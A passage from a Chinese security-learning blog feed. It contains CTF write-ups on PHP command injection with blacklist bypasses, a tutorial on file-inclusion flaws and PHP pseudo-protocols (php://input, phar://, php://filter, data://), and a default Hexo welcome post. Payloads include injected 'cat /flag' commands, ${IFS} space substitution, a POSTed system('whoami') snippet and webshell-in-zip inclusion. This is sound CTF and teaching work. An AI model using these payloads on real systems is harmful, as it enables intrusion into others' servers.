<code>strCheck</code> 函数对输入进行检查。</li><li>如果通过检查，使用 <code>shell_exec($cmd);</code> 执行命令。</li></ul></li></ol><ul><li>黑名单过滤了一些特殊字符和常见命令，但可以通过以下方法绕过：<ul><li><strong>使用未过滤的命令</strong>：<ul><li>例如：<code>ls</code>, <code>cat</code>, <code>tac</code>, <code>nl</code>, <code>rev</code>, <code>grep</code>, <code>find</code>, <code>echo</code> 等。</li></ul></li><li><strong>使用通配符</strong>：<ul><li>例如：<code>*</code> 可以匹配任意字符。</li></ul></li><li><strong>使用未过滤的管道符</strong>：<ul><li>例如：<code>|</code>（管道符）未被过滤，可以用于连接多个命令。</li></ul></li><li><strong>使用编码绕过</strong>：<ul><li>例如：将命令编码为十六进制或 Base64，然后解码执行。</li></ul></li></ul></li></ul><p><strong><code>/?cmd=ls /|tee a.txt</code></strong></p><ol><li><strong><code>tee a.txt</code></strong><ul><li><code>tee</code> 是一个 Linux 命令，用于将输入内容同时输出到屏幕和文件中。</li><li><code>tee a.txt</code> 会将 <code>ls /</code> 的结果输出到屏幕，并保存到 <code>a.txt</code> 文件中。</li></ul></li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316171420268.png" alt="image-20250316171420268"></p><p>接着  &#x2F;?cmd&#x3D;cat &#x2F;f*|tee a.txt</p><p>再访问a.xt</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316171742247.png" alt="image-20250316171742247"></p><h2 id="4-SWPUCTF-2023-秋季新生赛-Pingpingping"><a href="#4-SWPUCTF-2023-秋季新生赛-Pingpingping" class="headerlink" title="4.[SWPUCTF 2023 秋季新生赛]Pingpingping"></a>4.[SWPUCTF 2023 秋季新生赛]Pingpingping</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20201434.png"></p><p>需要我们以<a href="https://so.csdn.net/so/search?q=get&spm=1001.2101.3001.7020">get</a>的方式提交参数Ping_ip.exe。然后我们提交的参数会在system()函数中与<a href="https://so.csdn.net/so/search?q=ping%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">ping命令</a>连接在一起进行执行。</p><p>这里面的ping命令形式是不完整的，所以我们必须要先补全我们的ping命令再进行cat命令抓取。</p><p>ping命令的最基本形式只需包含目标主机的地址。我们只需要将它所给出的ping命令加上主机地址即可。这里我测试的是任何ip都可以。</p><p>?Ping[ip.exe&#x3D;127.0.0.1||cat &#x2F;flag</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20201749.png"></p><h2 id="5-FSCTF-2023-细狗2-0"><a href="#5-FSCTF-2023-细狗2-0" class="headerlink" title="5.[FSCTF 2023]细狗2.0"></a>5.[FSCTF 2023]细狗2.0</h2><ol><li></li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250316172351404.png" alt="image-20250316172351404"></p><p><img src="/.com//Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250316172334144.png" alt="image-20250316172334144"></p><p>2.发现有两个php，我们尝试用cat命令查看一下 ,尝试后构造出最终的payload</p><p>过滤了空格和cat 空格用${<a href="https://so.csdn.net/so/search?q=IFS&spm=1001.2101.3001.7020">IFS</a>}替换就行 cat用nl代替</p><p>1;nl${IFS}&#x2F;f*</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-16%20172713.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-NSSRound-8-Basic-MyDoor&quot;&gt;&lt;a href=&quot;#1-NSSRound-8-Basic-MyDoor&quot; class=&quot;headerlink&quot; title=&quot;1.[NSSRound#8 Basic]MyDoor&quot;&gt;&lt;/a&gt;1.[NSSRoun</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞分析</title>
    <link href="http://example.com/2025/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2025-03-16T13:05:30.000Z</published>
    <updated>2025-03-16T13:06:29.026Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞分析"><a href="#文件包含漏洞分析" class="headerlink" title="文件包含漏洞分析"></a>文件包含漏洞分析</h1><h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210210458941.png" alt="image-20241210210458941"></p><ul><li><p>像C语言中”#include&lt;stdio.h&gt;”就是把stdio.h这个头文件引入到当前环境中，在PHP中也有这样类似的函数，这些函数也是把外部的文件内容引入到当前环境。</p></li><li><p>比方说：</p></li></ul><p>PHP中也有include(“”)里面配置的也是我们要引入的外部的文件名，不过在这里，它的文件是一个.php文件的话，它是会对它解析执行，这样子这个php当中，所有的文件的变量定义、函数，在接下来的代码当中都能够使用了。</p><ul><li>文件包含漏洞是怎么回事：</li></ul><p>它其实就发生在，当上面这些文件包含函数它们的参数由用户可控，或部分可控的时候，我们就说它存在了文件包含漏洞。</p><p>​- 比如说：在一个代码当中，像这样子的include这样的函数，它直接由用户传入了一个参数（include($_GET[file])）；</p><p>​- 再比如：说require($a)中$a受到了用户输入的影响；</p><p>​- 这个时候我们就说，用户指定的输入就被当作了文件包含函数的参数，这个时候，这个代码就很有可能出现文件包含漏洞。</p><h2 id="文件包含利用的特点"><a href="#文件包含利用的特点" class="headerlink" title="文件包含利用的特点"></a>文件包含利用的特点</h2><p>先注意：再PHP文件的文件包含函数特点：</p><ul><li><p>文件包含的那个目标，他的内容是PHP，它将会解析执行</p><p>举例：</p><p>现在有一个文件包含函数include(“a.txt”),这个a.txt文件内容是一段php代码，这种情况下，这个”inciude(“a.txt”)”代码执行的结果就是a.txt当中包含的php代码被解析执行。</p></li><li><p>文件包含它的内容是普通文本，就会读取到文件内容</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210211515617.png" alt="image-20241210211515617"></p><p>像上图这样文件包含的代码，从这个代码出发，能做的利用有两种：</p><ul><li><p>本地文件包含(LFI)</p><p>这里填入的文件名是一个本地的文件名，这个时候利用的范围是相对来说比较受限的，只能用服务器上已经存在的文件作为文件包含的参数</p></li><li><p>远程文件包含(RFI)</p><p>利用条件会更加严格，对于php.ini当中的配置也会有一定的要求，而且默认php.ini的配置是不允许远程文件包含的，</p><p>如果一个代码中存在远程文件包含，甚至就可以作任意命令执行，可以直接拿到服务器的访问控制权，</p><p>因为：文件包含函数遇到内容是php,会解析执行，我只需要再我的服务器上放一段恶意的php代码，然后用远程文件包含的这个漏洞去包含我那个服务器的恶意的php，就能实现任意命令执行操作。</p></li></ul><p>接下来会以本地包含为主 ，远程能做的已经很多了，本地需要学习更多的技巧来突破他所带来的局限性。</p><p>局限1： 如果我们想要得到的目标是去读取php的源代码，不想要后端源代码的执行结果（直接访问php文件就可），有些情况通过文件包含的方式去执行php代码，不能通过文件访问的方式执行php代码，</p><p>局限2：我们知道本地文件包含的前提是我们想要一个文件包含的结果，他必须在本地服务器上存在对应的文件，需要一种办法可以任意的决定文件包含的结果。</p><p>想要突破本地文件包含的一些限制的话，需要一个工具：php伪协议。</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>伪协议：它长得像协议一样，它完成的是一些像协议的事情，但它本身不是一个协议。</p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210233431417.png" alt="image-20241210233431417"></p><p>如果file参数被放到像include()文件包含函数里面的话，那么D盘&#x2F;soft…里面的phpcode.txt文件就会被包含进去，如果这个文件的内容是php代码的话，它就会解析执行，即使它的扩展名是.txt；如果它的文件内容是普通文本的话，普通文本的内容就会被作为文件包含的结果。</p><h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php:&#x2F;&#x2F;input协议"></a>php:&#x2F;&#x2F;input协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210234012598.png" alt="image-20241210234012598"></p><p>当文件包含函数遇到php:&#x2F;&#x2F;input伪协议（include(“php:&#x2F;&#x2F;input”))的时候，它就会把POST的内容当作文件包含的结果。</p><p>例如：</p><p> <img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241210235158012.png" alt="image-20241210235158012"></p><p>在这里把php:&#x2F;&#x2F;input传入参数filename里面，参数后续会被放到文件包含的函数里面，这个时候我给他POST了一段php代码”<?php system('whoami');?>“,</p><p>它的结果是这段php代码解析执行后的结果，我让他执行woami,它就把当前的系统的用户名给输出出来了。</p><p>所以，php:&#x2F;&#x2F;input伪协议</p><p>可以用于执行php代码，（前提条件：allow_url_include是一个打开的状态）</p><p>可以用于控制文件包含的结果。 </p><h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211121432002.png" alt="image-20241211121432002"></p><p>xxx.png这个扩展名看起来是一个图片，遇到phar:&#x2F;&#x2F;伪协议，还是会当作压缩包来处理，会读取这个压缩包内部的shell.php文件。</p><p>用途：</p><p>文件上传漏洞组合拳：</p><p>文件上传的一大难点是限制扩展名，如果现在只允许上传zip压缩包，要实现任意命令执行该怎么办？——如果同时找到文件包含漏洞，就可以把一句话木马压缩到zip压缩包里面，</p><p>这种情况下配合phar:&#x2F;&#x2F;伪协议:(?file&#x3D;phar:&#x2F;&#x2F;zip&#x2F;trojan.php)就可以把这个压缩包里面的所包含的这个木马做解析执行的操作。</p><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip:&#x2F;&#x2F;伪协议"></a>zip:&#x2F;&#x2F;伪协议</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211122647534.png" alt="image-20241211122647534"></p><h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）"></a>php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</h3><p>![](C:\Users\lenovo\Pictures\Screenshots\屏幕截图 2024-12-11 124243.png)</p><p>看下面这个例子：</p><p>从右向左读：读取xxx.php这个文件内容，把它作为读取的源头（resource),接着对它做编码的转换，把它读取进来之后把它放到一个文件包含函数里面（filename);</p><p>原本文件包含函数include(xxx,php)直接往里面传一个php，会解析执行，把它解析执行的结果作为文件包含的结果，现在有了php:&#x2F;&#x2F;filter伪协议，将原本php代码的文件转换成不是php代码的格式（对它做编码了），作为普通文本，会把内容原封不动读取出来。</p><p>php:&#x2F;&#x2F;filter伪协议是用于突破做php代码的源代码读取。</p><h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data 伪协议是 PHP 中的一个特殊协议，它允许将原始数据嵌入到 URL 中。通过文件包含漏洞，我们可以利用这个 伪协议，将恶意 PHP 代码作为数据嵌入，并让服务器解释执行。 </p><p>data 伪协议 格式：</p><p> data:&#x2F;&#x2F;{}{,base64}, MIME-type：指定数据的类型，默认是 text&#x2F;plain。 charset：指定数据的编码类型，如 utf8，默认是这个类型，所以直接不显示。 base64：如果使用 Base64 编码，则加上该标识。 data：实际的数据内 容。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="1-利用php-input"><a href="#1-利用php-input" class="headerlink" title="1.利用php:&#x2F;&#x2F;input"></a>1.利用php:&#x2F;&#x2F;input</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20124539.png"></p><p>代码分析：</p><ol start="2"><li><p>把flag包含进去；</p></li><li><p>把当前的代码再页面上展示；</p></li><li><p>extract()函数：能够把数组变成变量名和变量名的声明；在这里把$_GET这个数组作为了estract这个函数的参数，这行代码执行后，用户传入的所有GET请求的参数，它的参数值就是变量值，参数名就变成了变量名；</p><p>如果现在发送的请求是：&#x2F;？a&#x3D;1&amp;b&#x3D;2,传了两个GET请求的参数，那么这行代码执行会就会变成：$a&#x3D;1;$b&#x3D;2;</p><p>后面的aurora1,aurora2…都可以传入GET型请求参数的方式对他的变量值进行定义；</p></li><li><p>判断aurora1的值是否为空；</p></li><li><p>把传入的aurora2作为文件包含的参数，也就是说把aurora2作为一个文件名，放入文件包含函数里面；</p><p>注意：aurora2是由用户可控的，这里就有了文件包含漏洞；</p><p>把aurora2这个文件读取出来后，去除首尾空格（trin()），把它的结果给aurora3，</p></li><li><p>核对：aurora1,3是否相等；</p></li></ol><p>这个题目原本的目的&#x2F;最直接的想法：</p><p>假如知道服务器里的一个文件和文件内容就好了，比如说，我们知道服务器有一个文件a.txt它的内容是123，那我们在aurora1里传入123，在2里传入a.txt，就满足条件，输出flag;</p><p>关键在于：不知道服务器上有什么文件，也不知内容；</p><p>解决办法：</p><p>php:&#x2F;&#x2F;input伪协议（把POST内容当作文件包含的结果）</p><p>在aurora2这里用php:&#x2F;&#x2F;input作为参数传进去，那么aurora3这里的结果就由我们可控了</p><p>具体操作：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20131900.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211132708945.png" alt="image-20241211132708945"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20132124.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211134636729.png" alt="image-20241211134636729"></p><ol start="2"><li><ol start="3"><li><ol start="4"><li>：从GET参数里面接收3个变量，user，file，pass，</li></ol></li></ol></li><li><p>判断user有没有set，然后从user 里面去读文件包含（这里有漏洞点），让文件包含结果&#x3D;&#x3D;the user is admin，用php:&#x2F;&#x2F;input伪协议；</p></li><li><p>进入题目第二步；把file作为文件包含的参数（也是文件包含漏洞）；</p><p>后面给了一个提示：好像想让我们包含class.php进去，但我们不知道class.php是什么，因此我们读取它的源代码，</p></li></ol><p>解题：</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-12-11%20192012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192104866.png" alt="image-20241211192104866"></p><p>进行base64解码；</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192224031.png" alt="image-20241211192224031"></p><ol start="2"><li>定义了一个类Read,</li><li>有一个成员变量或一个属性，它的值是file，</li><li>有一个魔术方法toString():把对象当作字符串来使用的时候，就会自动调用它的toString魔术方法，</li><li>如果file有内容的话，</li><li>就把它放在文件包含函数里面，</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211192958015.png" alt="image-20241211192958015"></p><ol start="8"><li><p>如果传人的file包含f1a9的话，（f1a9这个文件肯定很可疑，）</p></li><li><p>程序退出</p><p>因此，我们要设法把f1a9这个文件读取出来，</p></li><li><p>对pass这个参数做反序列化操作，</p></li><li><p>输出反序列化的对象；这里触发了上面魔术方法的触发条件，这个反序列化后的结果输出了出来，其实就是把反序列化这个Read对象当作字符串来用，相应的就会调用toString魔术方法，</p></li></ol><p>如果往12中传入的Read对象是一个file属性是一个f1a9.php源代码的属性，这个时候在后续13echo反序列化结果的时候，就会自动调用toString魔术方法，而这个魔术方法会自然而然的把Read这个file属性放到文件包含函数的参数里面，这时就变相的把f1a9.php的内容给读取出来了</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20241211194748494.png" alt="image-20241211194748494"></p><ol start="14"><li>进行序列化；</li></ol><p>后续把序列化内容放到index.php 12中。</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p><a href="https://www.nssctf.cn/problem/2821">https://www.nssctf.cn/problem/2821</a></p><h3 id="4-phar"><a href="#4-phar" class="headerlink" title="4.phar:&#x2F;&#x2F;"></a>4.phar:&#x2F;&#x2F;</h3><p><a href="https://blog.csdn.net/abc18964814133/article/details/124664538">伪协议解释+一道例题解析</a></p><p><a href="https://www.nssctf.cn/problem/2026">例题</a></p><p><a href="https://www.cnblogs.com/bkofyZ/p/17624634.html">解析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞分析&quot;&gt;&lt;a href=&quot;#文件包含漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞分析&quot;&gt;&lt;/a&gt;文件包含漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;什么是文件包含&quot;&gt;&lt;a href=&quot;#什么是文件包含&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2024/10/15/hello-world/"/>
    <id>http://example.com/2024/10/15/hello-world/</id>
    <published>2024-10-15T04:53:53.440Z</published>
    <updated>2024-10-15T04:53:53.440Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
